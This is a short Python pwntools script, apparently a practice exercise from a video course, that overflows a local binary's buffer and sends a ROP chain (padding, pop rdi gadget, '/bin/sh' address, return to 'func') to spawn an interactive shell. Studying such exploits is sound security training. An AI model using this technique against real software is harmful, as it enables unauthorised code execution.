'''
Author: 白银
Date: 2022-08-29 16:17:56
LastEditTime: 2022-08-29 16:50:53
LastEditors: 白银
Description: https://www.bilibili.com/video/BV1mr4y1Y7fW?p=18&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=2236.7
'''
from pwn import *

context(log_level = 'debug', arch = 'amd64', os = 'linux')

pwnfile = './question_4_2_x64'
io = process(pwnfile)

elf = ELF(pwnfile)
rop = ROP(pwnfile)

padding = 0x10

gdb.attach(io)
pause()

pop_rdi_ret = 0x40120b

bin_sh_addr = 0x404040

return_addr = elf.symbols['func']
# return_addr = 0x401142

# payload = b'a' * padding + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(return_addr)
payload = flat(['a' * padding, pop_rdi_ret, bin_sh_addr, return_addr])

delimiter = 'input:'

io.sendlineafter(delimiter, payload)
io.interactive()